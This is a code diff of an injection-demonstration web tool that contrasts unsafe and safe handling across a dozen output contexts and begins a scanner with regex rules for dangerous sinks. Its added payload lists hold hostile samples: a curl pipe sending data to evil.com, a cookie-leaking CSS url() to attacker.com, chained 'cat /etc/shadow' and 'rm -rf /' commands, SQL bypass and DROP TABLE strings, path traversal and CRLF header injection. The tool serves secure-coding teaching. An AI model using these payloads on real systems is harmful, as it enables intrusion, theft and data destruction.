-  explain:'<b>Never build markup by string concatenation.</b> Setting <code>.innerHTML</code> with raw input lets any <code>&lt;script&gt;</code> or event-handler attribute execute as code. Escaping the HTML-significant characters turns markup into inert text.',
-  code:`<span class="cm">// unsafe: user text becomes live markup</span>
+  safe: s => escapeHtml(s),
+  explain:'<b>Never build HTML markup by string concatenation.</b> Setting <code>.innerHTML</code> or interpolating into templates allows user input to inject executable <code>&lt;script&gt;</code> or event-handler attributes (like <code>onerror</code>). Escaping turns characters into inert text nodes.',
+  code:`<span class="cm">// UNSAFE: user text is parsed as HTML markup</span>
 el.innerHTML = userBio;
 
-<span class="cm">// safe: text stays text</span>
+<span class="cm">// SAFE: browser treats string purely as plain text</span>
 el.textContent = userBio;
-<span class="cm">// or, if you must keep innerHTML, escape first:</span>
-el.innerHTML = escapeHtml(userBio);`
+
+<span class="cm">// SAFE (if HTML is required): use DOMPurify library</span>
+el.innerHTML = DOMPurify.sanitize(userBio);`
  },
+
  htmlAttr:{
-  label:'HTML attribute', desc:'Text placed inside an attribute value, e.g. alt or title.',
-  placeholder:'x" onmouseover="alert(1)',
-  before:'<img alt="', after:'">',
-  flagChars:['"',"'",'<','>','`','='],
-  safe:s=>escapeHtmlAttr(s),
-  explain:'<b>Attribute context needs stricter escaping than body text.</b> A stray quote lets an attacker close the attribute and add a new one, like an event handler. Escape quotes, angle brackets, and backticks before interpolating into any attribute.',
-  code:`<span class="cm">// unsafe: quote breaks out of the attribute</span>
-html += '&lt;img alt="' + userAlt + '"&gt;';
+  label:'HTML attribute',
+  desc:'Text placed inside an HTML attribute value, e.g. <input value="..."> or <img alt="...">.',
+  placeholder:'x" onfocus="alert(1)" autofocus="',
+  payloads:[
+   {label:'Breakout + onfocus', val:'x" onfocus="alert(1)" autofocus="true'},
+   {label:'Javascript URI', val:'javascript:alert(1)'},
+   {label:'Backtick escape', val:'` onmouseover=`alert(1)'}
+  ],
+  before:'<img alt="', after:'" src="avatar.png">',
+  flagChars:['"',"'",'<','>','`','=','/'],
+  safe: s => escapeHtmlAttr(s),
+  explain:'<b>Attribute contexts need stricter escaping than body text.</b> An unescaped quote (or backtick) allows an attacker to close the current attribute and introduce new arbitrary attributes like <code>onfocus</code>, <code>onerror</code>, or <code>autofocus</code>.',
+  code:`<span class="cm">// UNSAFE: quote breaks out of attribute delimiter</span>
+html += '&lt;img alt="' + userAlt + '" src="avatar.png"&gt;';
 
-<span class="cm">// safe: escape before interpolating</span>
-html += '&lt;img alt="' + escapeHtmlAttr(userAlt) + '"&gt;';
-<span class="cm">// better: use DOM APIs instead of string-building</span>
-img.setAttribute('alt', userAlt);`
+<span class="cm">// SAFE: use native DOM property assignment</span>
+imgElement.alt = userAlt;
+
+<span class="cm">// SAFE: attribute-aware entity escaping</span>
+html += '&lt;img alt="' + escapeHtmlAttr(userAlt) + '" src="avatar.png"&gt;';`
  },
+
+ jsString:{
+  label:'Inline JS script variable',
+  desc:'Server-side rendering where dynamic values are directly embedded inside a <script> block.',
+  placeholder:'admin"; alert("pwned");//',
+  payloads:[
+   {label:'String breakout', val:'test"; alert(1);//'},
+   {label:'Tag closing attack', val:'<\/script><script>alert("XSS")<\/script>'}
+  ],
+  before:'<script>let currentUser = "', after:'";<\/script>',
+  flagChars:['"',"'",'\\','<','>','/','\n','\r',';'],
+  safe: s => escapeJsString(s),
+  explain:'<b>Standard HTML escaping DOES NOT protect inside &lt;script&gt; tags!</b> Browsers switch to the JavaScript tokenizer inside script blocks. An attacker can close the string with <code>"</code> or prematurely terminate the script with <code>&lt;/script&gt;</code>. Use JSON serialization with unicode angle brackets (<code>\\u003c</code>).',
+  code:`<span class="cm">// UNSAFE: HTML escaping is completely useless in script context</span>
+&lt;script&gt;let user = "&lt;%= escapeHtml(userInput) %&gt;";&lt;/script&gt;
+
+<span class="cm">// SAFE: use JSON.stringify and escape HTML tag brackets</span>
+&lt;script&gt;let user = &lt;%- JSON.stringify(userInput).replace(/&lt;/g, '\\\\u003c') %&gt;;&lt;/script&gt;
+
+<span class="cm">// BEST: Serve data via REST/JSON API or dataset attribute</span>
+&lt;div id="user-data" data-user="&lt;%= escapeHtmlAttr(JSON.stringify(user)) %&gt;"&gt;&lt;/div&gt;`
+ },
+
+ cssStyle:{
+  label:'CSS / Style attribute',
+  desc:'Dynamic input interpolated into a style tag or style attribute (e.g. custom user themes).',
+  placeholder:'red; background-image: url("javascript:alert(1)");',
+  payloads:[
+   {label:'URL script/exfil', val:'url("https://attacker.com/log?key=" + document.cookie)'},
+   {label:'Style breakout', val:'red; } body { display:none; }'}
+  ],
+  before:'<div style="color: ', after:';">Custom Theme</div>',
+  flagChars:[';',':','(',')','"','\'','\\','<','>'],
+  safe: s => sanitizeCssValue(s),
+  explain:'<b>CSS is an executable context in older browsers and a major vector for CSS exfiltration.</b> Unsanitized style injection lets attackers leak CSRF tokens or execute code via legacy <code>expression()</code> or CSS <code>url()</code> references.',
+  code:`<span class="cm">// UNSAFE: attacker can alter entire page styling or exfiltrate characters</span>
+element.setAttribute("style", "color: " + userColor);
+
+<span class="cm">// SAFE: strict allowlist of accepted CSS colors / values</span>
+const ALLOWED_COLORS = ['red', 'blue', 'green', '#333333'];
+element.style.color = ALLOWED_COLORS.includes(userColor) ? userColor : 'black';`
+ },
+
  url:{
-  label:'URL / query parameter', desc:'Text embedded in a link or query string.',
-  placeholder:'search term & category=all#done',
-  before:'/search?q=', after:'',
-  flagChars:['&','?','#','/',' ','='],
-  safe:s=>encodeURIComponent(s),
-  explain:'<b>Unencoded input can inject extra parameters or fragments.</b> An <code>&amp;</code> or <code>#</code> in raw input changes which query params the server actually receives. <code>encodeURIComponent</code> makes the value inert data again.',
-  code:`<span class="cm">// unsafe: & and # change the query structure</span>
-const url = \`/search?q=\${userQuery}\`;
+  label:'URL query parameter',
+  desc:'Text appended into URLs or redirect endpoints.',
+  placeholder:'search query & filter=admin#action',
+  payloads:[
+   {label:'Parameter override', val:'search & role=superadmin&debug=1'},
+   {label:'Fragment injection', val:'data#sensitive-view'},
+   {label:'Javascript protocol', val:'javascript:alert(1)'}
+  ],
+  before:'/api/search?q=', after:'&format=json',
+  flagChars:['&','?','#','/',' ','=',':'],
+  safe: s => encodeURIComponent(s),
+  explain:'<b>Unencoded values alter the parsed structure of query parameters.</b> Injected <code>&amp;</code> or <code>#</code> characters introduce fake query keys or truncate tracking. Always wrap query parameters with <code>encodeURIComponent()</code>.',
+  code:`<span class="cm">// UNSAFE: query delimiter injection</span>
+const url = '/search?q=' + userQuery + '&page=1';
 
-<span class="cm">// safe</span>
-const url = \`/search?q=\${encodeURIComponent(userQuery)}\`;`
+<span class="cm">// SAFE: correctly percent-encode parameter components</span>
+const url = '/search?q=' + encodeURIComponent(userQuery) + '&page=1';`
  },
+
  header:{
-  label:'HTTP header value', desc:'Text placed into a response header, e.g. a filename or redirect target.',
-  placeholder:'report.pdf\nSet-Cookie: session=evil',
+  label:'HTTP response header (CRLF)',
+  desc:'Text passed into response headers like Set-Cookie, Location, or Content-Disposition.',
+  placeholder:'report.pdf\r\nSet-Cookie: session=hijacked; Path=/',
+  payloads:[
+   {label:'Cookie injection', val:'invoice.pdf\r\nSet-Cookie: token=malicious; HttpOnly=false'},
+   {label:'HTTP Response Splitting', val:'test\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Defaced</h1>'}
+  ],
   before:'Content-Disposition: attachment; filename=', after:'',
-  flagChars:['\n',':'],
-  safe:s=>sanitizeHeaderValue(s),
-  explain:'<b>Header values must never contain a raw line break.</b> A newline reaching a raw header-writing call lets an attacker inject a second header — including a forged <code>Set-Cookie</code> — or split the response entirely. (Browsers normalize a textarea\'s value to plain <code>\\n</code>, so you won\'t see a literal <code>\\r</code> in this demo — but a bare LF alone is enough to trigger the same class of bug on many servers.) Strip or reject any line break in anything bound for a header.',
-  code:`<span class="cm">// unsafe: raw value written into a header</span>
+  flagChars:['\n','\r',':'],
+  safe: s => sanitizeHeaderValue(s),
+  explain:'<b>Header values must never contain CR (\\r) or LF (\\n).</b> Line breaks delimit HTTP headers. An embedded newline allows an attacker to inject arbitrary headers (such as fake cookies) or split the HTTP response completely.',
+  code:`<span class="cm">// UNSAFE: raw newline injects headers</span>
 res.setHeader('Content-Disposition', \`attachment; filename=\${filename}\`);
 
-<span class="cm">// safe: strip CR/LF first (most frameworks also do this for you)</span>
+<span class="cm">// SAFE: strip all CR and LF characters before setting header</span>
 const clean = filename.replace(/[\\r\\n]/g, '');
 res.setHeader('Content-Disposition', \`attachment; filename=\${clean}\`);`
  },
- sql:{
-  label:'Database query', desc:'Text used to filter or match a database record.',
-  placeholder:"o'brien",
-  before:"SELECT * FROM users WHERE name = '", after:"'",
-  flagChars:["'",'"',';','-'],
-  safe:s=>`SELECT * FROM users WHERE name = ?\n-- bound param: ${JSON.stringify(s)}`,
-  explain:'<b>Escaping quotes is not the fix here — parameterization is.</b> Manually doubling quotes still breaks under encoding tricks and comment syntax. A parameterized query keeps the value out of the SQL text entirely, so it can never change the query\'s structure.',
-  code:`<span class="cm">// unsafe: value is part of the SQL string</span>
-db.query("SELECT * FROM users WHERE name = '" + name + "'");
 
-<span class="cm">// safe: value is a bound parameter, never parsed as SQL</span>
-db.query("SELECT * FROM users WHERE name = ?", [name]);`
+ sql:{
+  label:'SQL database query',
+  desc:'User input used in queries to filter or retrieve records.',
+  placeholder:"o'brien' OR '1'='1",
+  payloads:[
+   {label:'Classic Auth Bypass', val:"admin' OR 1=1 --"},
+   {label:'UNION data leak', val:"' UNION SELECT null, username, password FROM users --"},
+   {label:'Stacked statement', val:"1; DROP TABLE logs; --"}
+  ],
+  before:"SELECT * FROM users WHERE username = '", after:"' AND active = 1;",
+  flagChars:["'",'"',';','-','/','*','#','\\'],
+  safe: s => `SELECT * FROM users WHERE username = ? AND active = 1;\n-- Parameter binding array: [${JSON.stringify(s)}]`,
+  explain:'<b>Quote escaping is NOT the solution — Parameterization is.</b> Attackers bypass manual escaping via character encoding mismatches, comment sequences, or numerical fields. Bound parameters separate query code from data at the database protocol driver level.',
+  code:`<span class="cm">// UNSAFE: dynamic string concatenation</span>
+db.query("SELECT * FROM users WHERE username = '" + req.body.username + "'");
+
+<span class="cm">// SAFE: Prepared statements with bound parameters</span>
+db.query("SELECT * FROM users WHERE username = ?", [req.body.username]);`
  },
+
  nosql:{
-  label:'NoSQL filter (type confusion)', desc:'The raw value of a field as it arrives in a parsed JSON request body.',
+  label:'NoSQL filter (type confusion)',
+  desc:'Values directly extracted from parsed JSON request bodies into document queries.',
   placeholder:'{"$ne": null}',
+  payloads:[
+   {label:'$ne password bypass', val:'{"$ne": null}'},
+   {label:'$gt comparison', val:'{"$gt": ""}'},
+   {label:'$regex evaluation', val:'{"$regex": "^admin"}'}
+  ],
   before:'db.users.find({ username: ', after:' })',
-  flagChars:['$','{','}'],
-  note:s=>{
+  flagChars:['$','{','}',':','"',"'",'[',']'],
+  note: s => {
    if(!s) return null;
    try{
-    const parsed=JSON.parse(s);
-    const t=Array.isArray(parsed)?'array':typeof parsed;
-    return (t==='object'&&parsed!==null)
-     ? `Parses as an <b>object</b>, not a string — some drivers treat keys like <code>$ne</code> / <code>$gt</code> / <code>$where</code> as query operators, silently changing what the filter matches.`
-     : `Parses as a <b>${t}</b> — still worth coercing explicitly rather than trusting the client's type.`;
+    const parsed = JSON.parse(s);
+    const t = Array.isArray(parsed) ? 'array' : typeof parsed;
+    return (t === 'object' && parsed !== null)
+     ? `⚠️ Parsed as an <b>Object</b>, not a primitive string. NoSQL engines treat keys starting with <code>$</code> as query operators, altering query logic.`
+     : `Parsed as a primitive <b>${t}</b>. Still enforce explicit type validation.`;
    }catch(e){
-    return `Not valid JSON — this would arrive as the plain string <code>${escapeHtml(s)}</code>.`;
+    return `Plain text input: <code>${escapeHtml(s)}</code>`;
    }
   },
-  safe:s=>{
-   let parsed; try{parsed=JSON.parse(s)}catch(e){parsed=s}
-   const shape = (typeof parsed==='object'&&parsed!==null) ? JSON.stringify(parsed) : String(parsed);
-   return `db.users.find({ username: String(value) })\n// value is coerced to a string first, so it can never act as a query operator\n// (the raw value received was: ${shape})`;
+  safe: s => {
+   let parsed; try{ parsed = JSON.parse(s); } catch(e){ parsed = s; }
+   const shape = (typeof parsed==='object' && parsed!==null) ? JSON.stringify(parsed) : String(parsed);
+   return `db.users.find({ username: String(req.body.username) })\n// Primitive coerced: ${JSON.stringify(shape)}`;
   },
-  explain:'<b>The bug here isn\'t missing punctuation — it\'s an unchecked type.</b> If a field expected to be a plain string can instead arrive as a parsed object (e.g. <code>{"$ne": null}</code>), some drivers interpret object keys like <code>$ne</code>, <code>$gt</code>, or <code>$where</code> as query operators. Coerce every value to its expected primitive type before it reaches a query, and validate the request shape against a schema.',
-  code:`<span class="cm">// unsafe: whatever shape the client sent is used directly</span>
-db.users.find({ username: req.body.username });
+  explain:'<b>NoSQL injection frequently occurs from type confusion.</b> When Express parses JSON, fields can arrive as nested objects instead of strings. MongoDB interprets <code>{"$ne": null}</code> as "not equal to null", authenticating without a valid password.',
+  code:`<span class="cm">// UNSAFE: untyped JSON parameter passed into query</span>
+db.users.findOne({ username: req.body.username, password: req.body.password });
 
-<span class="cm">// safe: force the expected primitive type first</span>
-db.users.find({ username: String(req.body.username) });`
+<span class="cm">// SAFE: explicitly cast to string and validate shape</span>
+const username = String(req.body.username || '');
+const password = String(req.body.password || '');
+db.users.findOne({ username, password });`
  },
+
  json:{
-  label:'JSON string value', desc:'Text inserted as a string value inside a JSON payload.',
-  placeholder:'She said "hi" and used a backslash \\ here',
-  before:'{"comment": "', after:'"}',
-  flagChars:['"','\\','\n'],
-  safe:s=>JSON.stringify({comment:s}),
-  explain:'<b>Never build JSON by hand-concatenating strings.</b> An unescaped quote or backslash in the value breaks the JSON structure before it ever reaches a parser. A real JSON encoder escapes every value correctly — quotes, backslashes, and control characters included.',
-  code:`<span class="cm">// unsafe: building JSON as a string by hand</span>
-const body = '{"comment": "' + comment + '"}';
+  label:'JSON string construction',
+  desc:'Manually assembling JSON strings instead of using serializers.',
+  placeholder:'hello", "isAdmin": true, "msg": "bye',
+  payloads:[
+   {label:'Key injection', val:'user", "role": "admin", "verified": true, "x": "1'},
+   {label:'Syntax breaker', val:'unclosed quote \\" and backslash \\'}
+  ],
+  before:'{"name": "', after:'", "status": "active"}',
+  flagChars:['"','\\','\n','\r','\t'],
+  safe: s => JSON.stringify({ name: s, status: "active" }, null, 2),
+  explain:'<b>Never build JSON strings by hand concatenation.</b> Injected quotation marks and commas inject additional JSON keys (such as <code>"role": "admin"</code>) or break JSON parsing altogether. Always construct an object and use <code>JSON.stringify()</code>.',
+  code:`<span class="cm">// UNSAFE: hand-rolled string concatenation</span>
+const payload = '{"name": "' + name + '", "status": "active"}';
 
-<span class="cm">// safe: let a real JSON encoder handle escaping</span>
-const body = JSON.stringify({ comment });`
+<span class="cm">// SAFE: use native JSON serializer</span>
+const payload = JSON.stringify({ name, status: "active" });`
  },
+
  filename:{
-  label:'Filesystem path', desc:'Text used to build a file path, e.g. an upload or export name.',
-  placeholder:'../../etc/passwd',
-  before:'fs.readFile("/uploads/', after:'")',
-  flagChars:['.','/','\\'],
-  safe:s=>sanitizeFilename(s),
-  explain:'<b>Never build a path from raw input.</b> Segments like <code>../</code> walk outside the intended directory. Strip to an allowlist of safe characters, collapse any run of dots, then resolve against a known base directory and confirm the result is still inside it.',
-  code:`<span class="cm">// unsafe: ../ escapes the uploads directory</span>
-fs.readFile(path.join(BASE, userFilename));
+  label:'Filesystem path / upload',
+  desc:'File paths constructed from user uploads or query downloads.',
+  placeholder:'../../../../etc/passwd',
+  payloads:[
+   {label:'Linux Path Traversal', val:'../../../../etc/passwd'},
+   {label:'Windows Path Traversal', val:'..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts'},
+   {label:'Null byte injection', val:'report.pdf\x00.exe'}
+  ],
+  before:'fs.readFile("/var/www/uploads/', after:'")',
+  flagChars:['.','/','\\',':','\x00'],
+  safe: s => sanitizeFilename(s),
+  explain:'<b>Directory traversal escapes intended storage boundaries.</b> Sequences like <code>../</code> allow reading arbitrary system configuration and secrets. Strip traversal sequences, allowlist safe characters, and enforce path containment.',
+  code:`<span class="cm">// UNSAFE: user input controls the filesystem target</span>
+const filepath = path.join('/var/www/uploads', req.query.file);
+fs.readFile(filepath, ...);
 
-<span class="cm">// safe: allowlist chars, collapse traversal sequences, verify containment</span>
-const clean = userFilename.replace(/[^A-Za-z0-9._-]/g, '_').replace(/\\.{2,}/g, '_');
-const full = path.resolve(BASE, clean);
-if (!full.startsWith(BASE)) throw new Error('invalid path');`
+<span class="cm">// SAFE: resolve against base folder and verify containment</span>
+const safeName = path.basename(req.query.file).replace(/[^a-zA-Z0-9._-]/g, '_');
+const fullPath = path.resolve('/var/www/uploads', safeName);
+if (!fullPath.startsWith('/var/www/uploads')) {
+  throw new Error('Access denied: Path Traversal Detected');
+}`
  },
+
  shell:{
-  label:'Shell command argument', desc:'Text that would be passed to a command-line program.',
-  placeholder:'file.txt; rm -rf ~',
-  before:'exec("convert ', after:' out.png")',
-  flagChars:[';','|','&','$','`'],
-  safe:s=>`execFile("convert", [${JSON.stringify(s)}, "out.png"])`,
-  explain:'<b>The real fix is avoiding the shell, not escaping for it.</b> Shell metacharacters are too easy to miss. Pass arguments as an array to a function that calls the program directly (no shell parsing) instead of building one command string.',
-  code:`<span class="cm">// unsafe: string is parsed by a shell</span>
-exec(\`convert \${filename} out.png\`);
+  label:'Shell command execution',
+  desc:'Commands executed via system shells (exec, system, popen).',
+  placeholder:'report.txt; rm -rf /; echo',
+  payloads:[
+   {label:'Semicolon command chaining', val:'file.pdf; cat /etc/shadow'},
+   {label:'Pipe injection', val:'data.csv | curl -X POST http://evil.com -d @-'},
+   {label:'Backtick execution', val:'`reboot`'}
+  ],
+  before:'exec("convert ', after:' thumbnail.jpg")',
+  flagChars:[';','|','&','$','`','>','<','\n','\r','\\','(',')'],
+  safe: s => `execFile("convert", [${JSON.stringify(s)}, "thumbnail.jpg"])`,
+  explain:'<b>Do not attempt to escape shell characters — bypass the shell entirely!</b> Metacharacters like <code>;</code>, <code>|</code>, <code>&amp;</code>, <code>$()</code>, and backticks execute arbitrary secondary commands. Use <code>execFile</code> or <code>spawn</code> with an argument array.',
+  code:`<span class="cm">// UNSAFE: command executed inside a shell</span>
+exec(\`convert \${filename} thumbnail.jpg\`);
 
-<span class="cm">// safe: arguments passed directly, no shell involved</span>
-execFile('convert', [filename, 'out.png']);`
+<span class="cm">// SAFE: direct executable invocation without shell interpretation</span>
+execFile('convert', [filename, 'thumbnail.jpg']);`
  },
- logline:{
-  label:'Log entry', desc:'Text written into an application log line, e.g. a username on login.',
-  placeholder:'alice\n[INFO] login success for admin',
-  before:'[INFO] login attempt: ', after:'',
-  flagChars:['\n','\r'],
-  safe:s=>sanitizeLogLine(s),
-  explain:'<b>A log line is a trust boundary too.</b> Anyone who can put a line break into a logged value can forge what looks like a separate, legitimate log entry — including a fake success message — which can mislead whoever reads that log during an investigation. Escape or strip line breaks before writing untrusted values into logs.',
-  code:`<span class="cm">// unsafe: a newline in the username forges a second log line</span>
-log.info('login attempt: ' + username);
 
-<span class="cm">// safe: escape line breaks so the value can never span lines</span>
-log.info('login attempt: ' + username.replace(/[\\r\\n]/g, '\\\\n'));`
+ logline:{
+  label:'Log line (Log injection / CRLF)',
+  desc:'User values recorded in application access or debug logs.',
+  placeholder:'alice\r\n[INFO] 2026-09-07 User admin authenticated successfully',
+  payloads:[
+   {label:'Fake authentication line', val:'guest\r\n[AUTH] 2026-09-07 User root authenticated successfully'},
+   {label:'Log defacement', val:'test\r\n\r\n*** SYSTEM CRITICAL FAILURE EMERGENCY ***'}
+  ],
+  before:'[INFO] Authentication attempt for: ', after:'',
+  flagChars:['\n','\r'],
+  safe: s => sanitizeLogLine(s),
+  explain:'<b>Application logs are trust boundaries.</b> Embedding line breaks in logged text lets attackers forge counterfeit log lines, obscuring security audits, tricking SIEM alerts, or masking malicious activity.',
+  code:`<span class="cm">// UNSAFE: newline injects fake log entry</span>
+logger.info("Login attempt: " + username);
+
+<span class="cm">// SAFE: escape or strip line breaks prior to logging</span>
+logger.info("Login attempt: " + username.replace(/[\\r\\n]/g, '\\\\n'));`
  }
 };
 
-let current = 'htmlBody';
-const $=id=>document.getElementById(id);
+let currentCtx = 'htmlBody';
+const $ = id => document.getElementById(id);
 
 function buildNav(){
- $('contexts').innerHTML=Object.entries(CTX).map(([k,c])=>
-  `<button class="ctxbtn${k===current?' active':''}" onclick="setCtx('${k}')">${c.label}</button>`).join('');
+ $('contexts').innerHTML = Object.entries(CTX).map(([k,c])=>
+  `<button class="ctxbtn${k===currentCtx?' active':''}" onclick="setCtx('${k}')">${c.label}</button>`).join('');
 }
-function setCtx(k){current=k;$('raw').value=CTX[k].placeholder;buildNav();render()}
-function render(){
- const c=CTX[current], s=$('raw').value;
- $('ctxDesc').textContent=c.desc;
- $('statLen').textContent=[...s].length;
- $('statFlag').textContent=[...s].filter(ch=>c.flagChars.includes(ch)).length;
 
- const box=$('unsafeOut'); box.innerHTML='';
+function setCtx(k){
+ currentCtx = k;
+ $('raw').value = CTX[k].placeholder;
+ buildNav();
+ renderPayloadButtons();
+ render();
+}
+
+function renderPayloadButtons(){
+ const c = CTX[currentCtx];
+ const container = $('payloadList');
+ if(!c.payloads || !c.payloads.length){ container.innerHTML=''; return; }
+ container.innerHTML = `<span style="font-size:11px;color:var(--muted);align-self:center">Test Payloads:</span>` +
+  c.payloads.map(p=>`<button class="action-btn" onclick="applyPayload('${encodeURIComponent(p.val)}')">${p.label}</button>`).join('');
+}
+
+function applyPayload(encodedVal){
+ $('raw').value = decodeURIComponent(encodedVal);
+ render();
+}
+
+function clearInput(){
+ $('raw').value = '';
+ render();
+}
+
+function resetDefaultPayload(){
+ $('raw').value = CTX[currentCtx].placeholder;
+ render();
+}
+
+function render(){
+ const c = CTX[currentCtx], s = $('raw').value;
+ $('ctxDesc').textContent = c.desc;
+ $('statLen').textContent = [...s].length;
+ $('statFlag').textContent = [...s].filter(ch => c.flagChars.includes(ch)).length;
+
+ const box = $('unsafeOut');
+ box.innerHTML = '';
  box.appendChild(document.createTextNode(c.before));
  for(const ch of s){
   if(c.flagChars.includes(ch)){
-   const sp=document.createElement('span'); sp.className='flag'; sp.textContent=ch; box.appendChild(sp);
+   const sp = document.createElement('span');
+   sp.className = 'flag';
+   sp.textContent = (ch === '\n') ? '\\n' : (ch === '\r') ? '\\r' : (ch === '\t') ? '\\t' : ch;
+   box.appendChild(sp);
   } else {
    box.appendChild(document.createTextNode(ch));
   }
  }
  box.appendChild(document.createTextNode(c.after));
 
- const note=$('typeNote');
+ const note = $('typeNote');
  const noteText = c.note ? c.note(s) : null;
- if(noteText){ note.style.display='block'; note.innerHTML=noteText; }
- else { note.style.display='none'; }
+ if(noteText){ note.style.display = 'block'; note.innerHTML = noteText; }
+ else { note.style.display = 'none'; }
 
  $('safeOut').textContent = s ? c.safe(s) : '—';
- $('explainOut').innerHTML=c.explain;
- $('codeOut').innerHTML=c.code;
+ $('explainOut').innerHTML = c.explain;
+ $('codeOut').innerHTML = c.code;
 }
-function fallbackCopy(text,done){
+
+function copyText(id, btn){
+ const text = $(id).textContent;
+ const old = btn.textContent;
+ const done = (ok) => {
+  btn.textContent = ok ? '✓ Copied' : 'Failed';
+  showToast(ok ? 'Copied to clipboard!' : 'Copy failed');
+  setTimeout(()=> btn.textContent = old, 1400);
+ };
+ if(navigator.clipboard && navigator.clipboard.writeText){
+  navigator.clipboard.writeText(text).then(()=>done(true)).catch(()=>fallbackCopy(text,done));
+ } else {
+  fallbackCopy(text, done);
+ }
+}
+
+function fallbackCopy(text, done){
  try{
-  const ta=document.createElement('textarea');
-  ta.value=text; ta.style.position='fixed'; ta.style.opacity='0'; ta.style.top='0'; ta.style.left='0';
+  const ta = document.createElement('textarea');
+  ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
   document.body.appendChild(ta); ta.focus(); ta.select();
-  const ok=document.execCommand('copy');
+  const ok = document.execCommand('copy');
   document.body.removeChild(ta);
   done(ok);
  }catch(e){ done(false); }
 }
-function copyText(id,btn){
- const text=$(id).textContent;
- const old=btn.textContent;
- const done=(ok)=>{ btn.textContent = ok?'copied':'copy failed'; setTimeout(()=>btn.textContent=old,1200); };
- if(navigator.clipboard && navigator.clipboard.writeText){
-  navigator.clipboard.writeText(text).then(()=>done(true)).catch(()=>fallbackCopy(text,done));
- } else {
-  fallbackCopy(text,done);
- }
-}
-function goPage(id,btn){
- document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+
+function goPage(id, btn){
+ document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  $(id).classList.add('active');
- document.querySelectorAll('.navbtn').forEach(b=>b.classList.remove('active'));
+ document.querySelectorAll('.navbtn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
 }
 
-const REF=[
- ['Cross-site scripting (XSS)','Escape on output, per context','Untrusted text is inserted into a page and browsers treat it as markup instead of text. Escape for the exact context (body, attribute, JS string, URL) at the point of output — not just once, somewhere earlier.'],
- ['SQL injection','Parameterize, never concatenate','Untrusted text becomes part of a query\'s literal syntax. Bound parameters keep data and code separate at the driver level, so no input can alter the query\'s structure.'],
- ['NoSQL injection','Coerce types before querying','A value expected to be a primitive can arrive as an object or operator. Validate and coerce types, and validate the query shape against a schema.'],
- ['Command injection','Avoid the shell entirely','A string built from user input is handed to a shell that parses ; | & `. Call programs directly with an argument array instead of building a command string.'],
- ['Path traversal','Allowlist + verify containment','Segments like ../ let a path escape its intended directory. Strip to a safe character set, resolve the full path, and confirm it still starts with the intended base directory.'],
- ['HTTP header / response splitting','Strip line breaks before writing headers','A raw newline in a header value lets an attacker inject additional headers or split the response. Reject or strip \\r\\n in anything destined for a header.'],
- ['Log injection / log forging','Escape line breaks before writing logs','A newline in a logged value can forge a fake, separate-looking log entry. Escape or strip line breaks in anything untrusted before it reaches a log.'],
- ['Server-side request forgery (SSRF)','Allowlist destinations, block internal ranges','A server fetches a URL supplied by a user. Restrict to an allowlist of expected hosts/schemes and explicitly reject loopback, link-local, and private IP ranges.'],
- ['Open redirect','Allowlist redirect targets','A redirect URL taken from user input can point anywhere, aiding phishing. Only redirect to a known, allowlisted set of internal paths or domains.'],
- ['ReDoS (regex denial of service)','Avoid catastrophic backtracking','Some regexes take exponential time on crafted input due to nested quantifiers. Prefer simple patterns, cap input length before matching, and time-box regex evaluation on user-supplied patterns.'],
- ['Insecure deserialization','Prefer plain data formats over native object graphs','Deserializing untrusted bytes with a language\'s native mechanism (pickle, unserialize, ObjectInputStream) can trigger arbitrary code execution via gadget chains. Use JSON or another plain data format for untrusted input.'],
- ['CSRF / broken CORS','Verify origin, don\'t just trust credentials','A wildcard CORS origin or a missing anti-CSRF token lets other sites trigger authenticated requests or read responses. Echo back a specific allowlisted origin and require a per-session token for state-changing requests.']
-];
-function buildRef(){
- $('refgrid').innerHTML=REF.map(([t,p,d])=>
-  `<div class="refcard"><h3>${t}</h3><div class="principle">${p}</div><p>${d}</p></div>`).join('');
-}
+/* ==================== EXPANDED SCANNER ENGINE (35+ RULES) ==================== */
+const RULES = [
+ /* HIGH SEVERITY */
+ {
+  id:'dom-innerhtml', sev:'high',
+  re:/\.innerHTML\s*=(?!=)/g,
+  title:'Unescaped DOM Sink (.innerHTML)',
+  cat:'XSS',
+  why:'Assigning unescaped user-controlled text directly to innerHTML parses HTML tags and executes embedded scripts.',
+  fix:'Use el.textContent for plain strings, or use a sanitizer library (DOMPurify.sanitize(input)) if markup is required.'
+ },
+ {
+  id:'dom-write', sev:'high',
+  re:/document\.write(ln)?\s*\(/g,
+  title:'Dangerous document.write() Sink',
+  cat:'XSS',
+  why:'document.write writes raw unsanitized HTML markup directly into the document stream.',
+  fix:'Use modern DOM creation APIs (document.createElement, el.textContent, appendChild).'
+ },
+ {
+  id:'eval-exec', sev:'high',
+  re:/\beval\s*\(/g,
+  title:'Dynamic Code Execution (eval)',
+  cat:'RCE',
+  why:'eval() evaluates arbitrary text strings as executable JavaScript. Any user-influenced parameter results in full RCE.',
+  fix:'Avoid dynamic evaluation completely. Use JSON.parse() for data serialization or typed parsers.'
+ },
+ {
+  id:'new-function', sev:'high',
+  re:/new\s+Function\s*\(/g,
+  title:'new Function() Dynamic Compilation',
+  cat:'RCE',
+  why:'Compiles dynamic strings into executable function bodies at runtime, behaving identically to eval().',
+  fix:'Refactor to use standard declared functions or mapping dictionaries.'
+ },
+ {
+  id:'node-shell-exec', sev:'high',
+  re:/child_process\.exec\s*\(|(?<![.\w])exec\s*\(\s*[`'"][^`'"]*\$\{/g,
+  title:'Command Injection (Node.js child_process.exec)',
+  cat:'Command Injection',
+  why:'exec() runs the string argument inside a system shell (/bin/sh or cmd.exe). Characters like ; | & ` spawn secondary attacker commands.',
+  fix:'Use execFile() or spawn() passing the command arguments in an array: execFile("prog", [arg1, arg2]).'
+ },
+ {
+  id:'python-shell', sev:'high',
+  re:/os\.(system|popen)\s*\(|subprocess\.(Popen|run|call)\s*\([^)]*shell\s*=\s*True/g,
+  title:'Command Injection (Python shell=True / os.system)',
+  cat:'Command Injection',
+  why:'os.system() and subprocess with shell=True delegate execution to the operating system shell.',
+  fix:'Set shell=False (the default) and pass arguments as a list: subprocess.run(["ls", "-la", path]).'
+ },
+ {
+  id:'php-shell', sev:'high',
+  re:/\b(system|shell_exec|passthru|exec|popen|proc_open)\s*\([^)]*\$/g,
+  title:'Command Injection (PHP Shell Execution)',
+  cat:'Command Injection',
+  why:'Passing unescaped PHP variables into command functions allows arbitrary terminal command injection.',
